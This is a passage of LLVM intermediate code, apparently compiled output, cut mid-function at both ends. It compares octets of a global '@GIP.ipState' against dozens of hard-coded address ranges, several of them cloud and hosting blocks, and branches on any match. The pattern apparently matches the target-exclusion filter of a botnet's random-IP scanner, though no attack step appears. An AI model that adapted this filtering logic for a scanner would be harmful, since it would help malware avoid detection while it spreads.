  %1839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1840 = zext i8 %1839 to i32
  %1841 = icmp eq i32 %1840, 192
  br i1 %1841, label %1842, label %1854

; <label>:1842:                                   ; preds = %1838
  %1843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1844 = zext i8 %1843 to i32
  %1845 = icmp eq i32 %1844, 40
  br i1 %1845, label %1846, label %1854

; <label>:1846:                                   ; preds = %1842
  %1847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1848 = zext i8 %1847 to i32
  %1849 = icmp sge i32 %1848, 56
  br i1 %1849, label %1850, label %1854

; <label>:1850:                                   ; preds = %1846
  %1851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1852 = zext i8 %1851 to i32
  %1853 = icmp slt i32 %1852, 59
  br i1 %1853, label %2322, label %1854

; <label>:1854:                                   ; preds = %1850, %1846, %1842, %1838
  %1855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1856 = zext i8 %1855 to i32
  %1857 = icmp eq i32 %1856, 198
  br i1 %1857, label %1858, label %1870

; <label>:1858:                                   ; preds = %1854
  %1859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1860 = zext i8 %1859 to i32
  %1861 = icmp eq i32 %1860, 8
  br i1 %1861, label %1862, label %1870

; <label>:1862:                                   ; preds = %1858
  %1863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1864 = zext i8 %1863 to i32
  %1865 = icmp sge i32 %1864, 81
  br i1 %1865, label %1866, label %1870

; <label>:1866:                                   ; preds = %1862
  %1867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1868 = zext i8 %1867 to i32
  %1869 = icmp slt i32 %1868, 95
  br i1 %1869, label %2322, label %1870

; <label>:1870:                                   ; preds = %1866, %1862, %1858, %1854
  %1871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1872 = zext i8 %1871 to i32
  %1873 = icmp eq i32 %1872, 199
  br i1 %1873, label %1874, label %1886

; <label>:1874:                                   ; preds = %1870
  %1875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1876 = zext i8 %1875 to i32
  %1877 = icmp eq i32 %1876, 116
  br i1 %1877, label %1878, label %1886

; <label>:1878:                                   ; preds = %1874
  %1879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1880 = zext i8 %1879 to i32
  %1881 = icmp sge i32 %1880, 112
  br i1 %1881, label %1882, label %1886

; <label>:1882:                                   ; preds = %1878
  %1883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1884 = zext i8 %1883 to i32
  %1885 = icmp slt i32 %1884, 119
  br i1 %1885, label %2322, label %1886

; <label>:1886:                                   ; preds = %1882, %1878, %1874, %1870
  %1887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1888 = zext i8 %1887 to i32
  %1889 = icmp eq i32 %1888, 199
  br i1 %1889, label %1890, label %1902

; <label>:1890:                                   ; preds = %1886
  %1891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1892 = zext i8 %1891 to i32
  %1893 = icmp eq i32 %1892, 229
  br i1 %1893, label %1894, label %1902

; <label>:1894:                                   ; preds = %1890
  %1895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1896 = zext i8 %1895 to i32
  %1897 = icmp sge i32 %1896, 248
  br i1 %1897, label %1898, label %1902

; <label>:1898:                                   ; preds = %1894
  %1899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1900 = zext i8 %1899 to i32
  %1901 = icmp slt i32 %1900, 255
  br i1 %1901, label %2322, label %1902

; <label>:1902:                                   ; preds = %1898, %1894, %1890, %1886
  %1903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1904 = zext i8 %1903 to i32
  %1905 = icmp eq i32 %1904, 199
  br i1 %1905, label %1906, label %1918

; <label>:1906:                                   ; preds = %1902
  %1907 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1908 = zext i8 %1907 to i32
  %1909 = icmp eq i32 %1908, 36
  br i1 %1909, label %1910, label %1918

; <label>:1910:                                   ; preds = %1906
  %1911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1912 = zext i8 %1911 to i32
  %1913 = icmp sge i32 %1912, 220
  br i1 %1913, label %1914, label %1918

; <label>:1914:                                   ; preds = %1910
  %1915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1916 = zext i8 %1915 to i32
  %1917 = icmp slt i32 %1916, 223
  br i1 %1917, label %2322, label %1918

; <label>:1918:                                   ; preds = %1914, %1910, %1906, %1902
  %1919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1920 = zext i8 %1919 to i32
  %1921 = icmp eq i32 %1920, 199
  br i1 %1921, label %1922, label %1934

; <label>:1922:                                   ; preds = %1918
  %1923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1924 = zext i8 %1923 to i32
  %1925 = icmp eq i32 %1924, 58
  br i1 %1925, label %1926, label %1934

; <label>:1926:                                   ; preds = %1922
  %1927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1928 = zext i8 %1927 to i32
  %1929 = icmp sge i32 %1928, 184
  br i1 %1929, label %1930, label %1934

; <label>:1930:                                   ; preds = %1926
  %1931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1932 = zext i8 %1931 to i32
  %1933 = icmp slt i32 %1932, 187
  br i1 %1933, label %2322, label %1934

; <label>:1934:                                   ; preds = %1930, %1926, %1922, %1918
  %1935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1936 = zext i8 %1935 to i32
  %1937 = icmp eq i32 %1936, 206
  br i1 %1937, label %1938, label %1950

; <label>:1938:                                   ; preds = %1934
  %1939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1940 = zext i8 %1939 to i32
  %1941 = icmp eq i32 %1940, 220
  br i1 %1941, label %1942, label %1950

; <label>:1942:                                   ; preds = %1938
  %1943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1944 = zext i8 %1943 to i32
  %1945 = icmp sge i32 %1944, 172
  br i1 %1945, label %1946, label %1950

; <label>:1946:                                   ; preds = %1942
  %1947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1948 = zext i8 %1947 to i32
  %1949 = icmp slt i32 %1948, 175
  br i1 %1949, label %2322, label %1950

; <label>:1950:                                   ; preds = %1946, %1942, %1938, %1934
  %1951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1952 = zext i8 %1951 to i32
  %1953 = icmp eq i32 %1952, 208
  br i1 %1953, label %1954, label %1966

; <label>:1954:                                   ; preds = %1950
  %1955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1956 = zext i8 %1955 to i32
  %1957 = icmp eq i32 %1956, 78
  br i1 %1957, label %1958, label %1966

; <label>:1958:                                   ; preds = %1954
  %1959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1960 = zext i8 %1959 to i32
  %1961 = icmp sge i32 %1960, 40
  br i1 %1961, label %1962, label %1966

; <label>:1962:                                   ; preds = %1958
  %1963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1964 = zext i8 %1963 to i32
  %1965 = icmp slt i32 %1964, 43
  br i1 %1965, label %2322, label %1966

; <label>:1966:                                   ; preds = %1962, %1958, %1954, %1950
  %1967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1968 = zext i8 %1967 to i32
  %1969 = icmp eq i32 %1968, 208
  br i1 %1969, label %1970, label %1982

; <label>:1970:                                   ; preds = %1966
  %1971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1972 = zext i8 %1971 to i32
  %1973 = icmp eq i32 %1972, 93
  br i1 %1973, label %1974, label %1982

; <label>:1974:                                   ; preds = %1970
  %1975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1976 = zext i8 %1975 to i32
  %1977 = icmp sge i32 %1976, 192
  br i1 %1977, label %1978, label %1982

; <label>:1978:                                   ; preds = %1974
  %1979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1980 = zext i8 %1979 to i32
  %1981 = icmp slt i32 %1980, 193
  br i1 %1981, label %2322, label %1982

; <label>:1982:                                   ; preds = %1978, %1974, %1970, %1966
  %1983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1984 = zext i8 %1983 to i32
  %1985 = icmp eq i32 %1984, 66
  br i1 %1985, label %1986, label %1998

; <label>:1986:                                   ; preds = %1982
  %1987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1988 = zext i8 %1987 to i32
  %1989 = icmp eq i32 %1988, 71
  br i1 %1989, label %1990, label %1998

; <label>:1990:                                   ; preds = %1986
  %1991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1992 = zext i8 %1991 to i32
  %1993 = icmp sge i32 %1992, 240
  br i1 %1993, label %1994, label %1998

; <label>:1994:                                   ; preds = %1990
  %1995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1996 = zext i8 %1995 to i32
  %1997 = icmp slt i32 %1996, 255
  br i1 %1997, label %2322, label %1998

; <label>:1998:                                   ; preds = %1994, %1990, %1986, %1982
  %1999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2000 = zext i8 %1999 to i32
  %2001 = icmp eq i32 %2000, 98
  br i1 %2001, label %2002, label %2014

; <label>:2002:                                   ; preds = %1998
  %2003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2004 = zext i8 %2003 to i32
  %2005 = icmp eq i32 %2004, 142
  br i1 %2005, label %2006, label %2014

; <label>:2006:                                   ; preds = %2002
  %2007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2008 = zext i8 %2007 to i32
  %2009 = icmp sge i32 %2008, 208
  br i1 %2009, label %2010, label %2014

; <label>:2010:                                   ; preds = %2006
  %2011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2012 = zext i8 %2011 to i32
  %2013 = icmp slt i32 %2012, 223
  br i1 %2013, label %2322, label %2014

; <label>:2014:                                   ; preds = %2010, %2006, %2002, %1998
  %2015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2016 = zext i8 %2015 to i32
  %2017 = icmp eq i32 %2016, 107
  br i1 %2017, label %2018, label %2026

; <label>:2018:                                   ; preds = %2014
  %2019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2020 = zext i8 %2019 to i32
  %2021 = icmp sge i32 %2020, 20
  br i1 %2021, label %2022, label %2026

; <label>:2022:                                   ; preds = %2018
  %2023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2024 = zext i8 %2023 to i32
  %2025 = icmp slt i32 %2024, 24
  br i1 %2025, label %2322, label %2026

; <label>:2026:                                   ; preds = %2022, %2018, %2014
  %2027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2028 = zext i8 %2027 to i32
  %2029 = icmp eq i32 %2028, 35
  br i1 %2029, label %2030, label %2038

; <label>:2030:                                   ; preds = %2026
  %2031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2032 = zext i8 %2031 to i32
  %2033 = icmp sge i32 %2032, 159
  br i1 %2033, label %2034, label %2038

; <label>:2034:                                   ; preds = %2030
  %2035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = icmp slt i32 %2036, 183
  br i1 %2037, label %2322, label %2038

; <label>:2038:                                   ; preds = %2034, %2030, %2026
  %2039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2040 = zext i8 %2039 to i32
  %2041 = icmp eq i32 %2040, 52
  br i1 %2041, label %2042, label %2050

; <label>:2042:                                   ; preds = %2038
  %2043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2044 = zext i8 %2043 to i32
  %2045 = icmp sge i32 %2044, 1
  br i1 %2045, label %2046, label %2050

; <label>:2046:                                   ; preds = %2042
  %2047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2048 = zext i8 %2047 to i32
  %2049 = icmp slt i32 %2048, 95
  br i1 %2049, label %2322, label %2050

; <label>:2050:                                   ; preds = %2046, %2042, %2038
  %2051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2052 = zext i8 %2051 to i32
  %2053 = icmp eq i32 %2052, 52
  br i1 %2053, label %2054, label %2062

; <label>:2054:                                   ; preds = %2050
  %2055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = icmp sge i32 %2056, 95
  br i1 %2057, label %2058, label %2062

; <label>:2058:                                   ; preds = %2054
  %2059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2060 = zext i8 %2059 to i32
  %2061 = icmp slt i32 %2060, 255
  br i1 %2061, label %2322, label %2062

; <label>:2062:                                   ; preds = %2058, %2054, %2050
  %2063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2064 = zext i8 %2063 to i32
  %2065 = icmp eq i32 %2064, 54
  br i1 %2065, label %2066, label %2074

; <label>:2066:                                   ; preds = %2062
  %2067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2068 = zext i8 %2067 to i32
  %2069 = icmp sge i32 %2068, 64
  br i1 %2069, label %2070, label %2074

; <label>:2070:                                   ; preds = %2066
  %2071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2072 = zext i8 %2071 to i32
  %2073 = icmp slt i32 %2072, 95
  br i1 %2073, label %2322, label %2074

; <label>:2074:                                   ; preds = %2070, %2066, %2062
  %2075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2076 = zext i8 %2075 to i32
  %2077 = icmp eq i32 %2076, 54
  br i1 %2077, label %2078, label %2086

; <label>:2078:                                   ; preds = %2074
  %2079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2080 = zext i8 %2079 to i32
  %2081 = icmp sge i32 %2080, 144
  br i1 %2081, label %2082, label %2086

; <label>:2082:                                   ; preds = %2078
  %2083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2084 = zext i8 %2083 to i32
  %2085 = icmp slt i32 %2084, 255
  br i1 %2085, label %2322, label %2086

; <label>:2086:                                   ; preds = %2082, %2078, %2074
  %2087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2088 = zext i8 %2087 to i32
  %2089 = icmp eq i32 %2088, 13
  br i1 %2089, label %2090, label %2098

; <label>:2090:                                   ; preds = %2086
  %2091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2092 = zext i8 %2091 to i32
  %2093 = icmp sge i32 %2092, 52
  br i1 %2093, label %2094, label %2098

; <label>:2094:                                   ; preds = %2090
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp slt i32 %2096, 60
  br i1 %2097, label %2322, label %2098

; <label>:2098:                                   ; preds = %2094, %2090, %2086
  %2099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2100 = zext i8 %2099 to i32
  %2101 = icmp eq i32 %2100, 13
  br i1 %2101, label %2102, label %2110

; <label>:2102:                                   ; preds = %2098
  %2103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2104 = zext i8 %2103 to i32
  %2105 = icmp sge i32 %2104, 112
  br i1 %2105, label %2106, label %2110

; <label>:2106:                                   ; preds = %2102
  %2107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2108 = zext i8 %2107 to i32
  %2109 = icmp slt i32 %2108, 115
  br i1 %2109, label %2322, label %2110

; <label>:2110:                                   ; preds = %2106, %2102, %2098
  %2111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2112 = zext i8 %2111 to i32
  %2113 = icmp eq i32 %2112, 163
  br i1 %2113, label %2114, label %2118

; <label>:2114:                                   ; preds = %2110
  %2115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2116 = zext i8 %2115 to i32
  %2117 = icmp eq i32 %2116, 172
  br i1 %2117, label %2322, label %2118

; <label>:2118:                                   ; preds = %2114, %2110
  %2119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2120 = zext i8 %2119 to i32
  %2121 = icmp eq i32 %2120, 51
  br i1 %2121, label %2122, label %2130

; <label>:2122:                                   ; preds = %2118
  %2123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2124 = zext i8 %2123 to i32
  %2125 = icmp sge i32 %2124, 15
  br i1 %2125, label %2126, label %2130

; <label>:2126:                                   ; preds = %2122
  %2127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2128 = zext i8 %2127 to i32
  %2129 = icmp slt i32 %2128, 255
  br i1 %2129, label %2322, label %2130

; <label>:2130:                                   ; preds = %2126, %2122, %2118
  %2131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2132 = zext i8 %2131 to i32
  %2133 = icmp eq i32 %2132, 79
  br i1 %2133, label %2134, label %2146

; <label>:2134:                                   ; preds = %2130
  %2135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2136 = zext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 121
  br i1 %2137, label %2138, label %2146

; <label>:2138:                                   ; preds = %2134
  %2139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2140 = zext i8 %2139 to i32
  %2141 = icmp sge i32 %2140, 128
  br i1 %2141, label %2142, label %2146

; <label>:2142:                                   ; preds = %2138
  %2143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2144 = zext i8 %2143 to i32
  %2145 = icmp slt i32 %2144, 255
  br i1 %2145, label %2322, label %2146

; <label>:2146:                                   ; preds = %2142, %2138, %2134, %2130
  %2147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2148 = zext i8 %2147 to i32
  %2149 = icmp eq i32 %2148, 212
  br i1 %2149, label %2150, label %2162

; <label>:2150:                                   ; preds = %2146
  %2151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2152 = zext i8 %2151 to i32
  %2153 = icmp eq i32 %2152, 47
  br i1 %2153, label %2154, label %2162

; <label>:2154:                                   ; preds = %2150
  %2155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2156 = zext i8 %2155 to i32
  %2157 = icmp sge i32 %2156, 224
  br i1 %2157, label %2158, label %2162

; <label>:2158:                                   ; preds = %2154
  %2159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2160 = zext i8 %2159 to i32
  %2161 = icmp slt i32 %2160, 255
  br i1 %2161, label %2322, label %2162

; <label>:2162:                                   ; preds = %2158, %2154, %2150, %2146
  %2163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2164 = zext i8 %2163 to i32
  %2165 = icmp eq i32 %2164, 89
  br i1 %2165, label %2166, label %2178

; <label>:2166:                                   ; preds = %2162
  %2167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2168 = zext i8 %2167 to i32
  %2169 = icmp eq i32 %2168, 34
  br i1 %2169, label %2170, label %2178

; <label>:2170:                                   ; preds = %2166
  %2171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2172 = zext i8 %2171 to i32
  %2173 = icmp sge i32 %2172, 96
  br i1 %2173, label %2174, label %2178

; <label>:2174:                                   ; preds = %2170
  %2175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2176 = zext i8 %2175 to i32
  %2177 = icmp slt i32 %2176, 97
  br i1 %2177, label %2322, label %2178

; <label>:2178:                                   ; preds = %2174, %2170, %2166, %2162
  %2179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2180 = zext i8 %2179 to i32
  %2181 = icmp eq i32 %2180, 219
  br i1 %2181, label %2182, label %2190

; <label>:2182:                                   ; preds = %2178
  %2183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2184 = zext i8 %2183 to i32
  %2185 = icmp sge i32 %2184, 216
  br i1 %2185, label %2186, label %2190

; <label>:2186:                                   ; preds = %2182
  %2187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2188 = zext i8 %2187 to i32
  %2189 = icmp slt i32 %2188, 231
  br i1 %2189, label %2322, label %2190

; <label>:2190:                                   ; preds = %2186, %2182, %2178
  %2191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2192 = zext i8 %2191 to i32
  %2193 = icmp eq i32 %2192, 23
  br i1 %2193, label %2194, label %2202

; <label>:2194:                                   ; preds = %2190
  %2195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = icmp sge i32 %2196, 94
  br i1 %2197, label %2198, label %2202

; <label>:2198:                                   ; preds = %2194
  %2199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2200 = zext i8 %2199 to i32
  %2201 = icmp slt i32 %2200, 109
  br i1 %2201, label %2322, label %2202

; <label>:2202:                                   ; preds = %2198, %2194, %2190
  %2203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2204 = zext i8 %2203 to i32
  %2205 = icmp eq i32 %2204, 178
  br i1 %2205, label %2206, label %2214

; <label>:2206:                                   ; preds = %2202
  %2207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2208 = zext i8 %2207 to i32
  %2209 = icmp sge i32 %2208, 62
  br i1 %2209, label %2210, label %2214

; <label>:2210:                                   ; preds = %2206
  %2211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2212 = zext i8 %2211 to i32
  %2213 = icmp slt i32 %2212, 63
  br i1 %2213, label %2322, label %2214

; <label>:2214:                                   ; preds = %2210, %2206, %2202
  %2215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2216 = zext i8 %2215 to i32
  %2217 = icmp eq i32 %2216, 106
  br i1 %2217, label %2218, label %2226

; <label>:2218:                                   ; preds = %2214
  %2219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2220 = zext i8 %2219 to i32
  %2221 = icmp sge i32 %2220, 182
  br i1 %2221, label %2222, label %2226

; <label>:2222:                                   ; preds = %2218
  %2223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2224 = zext i8 %2223 to i32
  %2225 = icmp slt i32 %2224, 189
  br i1 %2225, label %2322, label %2226

; <label>:2226:                                   ; preds = %2222, %2218, %2214
  %2227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2228 = zext i8 %2227 to i32
  %2229 = icmp eq i32 %2228, 106
  br i1 %2229, label %2230, label %2234

; <label>:2230:                                   ; preds = %2226
  %2231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2232 = zext i8 %2231 to i32
  %2233 = icmp sge i32 %2232, 184
  br i1 %2233, label %2322, label %2234

; <label>:2234:                                   ; preds = %2230, %2226
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 106
  br i1 %2237, label %2238, label %2242

; <label>:2238:                                   ; preds = %2234
  %2239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2240 = zext i8 %2239 to i32
  %2241 = icmp eq i32 %2240, 105
  br i1 %2241, label %2322, label %2242

; <label>:2242:                                   ; preds = %2238, %2234
  %2243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2244 = zext i8 %2243 to i32
  %2245 = icmp eq i32 %2244, 34
  br i1 %2245, label %2246, label %2254

; <label>:2246:                                   ; preds = %2242
  %2247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2248 = zext i8 %2247 to i32
  %2249 = icmp sge i32 %2248, 245
  br i1 %2249, label %2250, label %2254

; <label>:2250:                                   ; preds = %2246
  %2251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2252 = zext i8 %2251 to i32
  %2253 = icmp slt i32 %2252, 255
  br i1 %2253, label %2322, label %2254

; <label>:2254:                                   ; preds = %2250, %2246, %2242
  %2255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2256 = zext i8 %2255 to i32
  %2257 = icmp eq i32 %2256, 87
  br i1 %2257, label %2258, label %2266

; <label>:2258:                                   ; preds = %2254
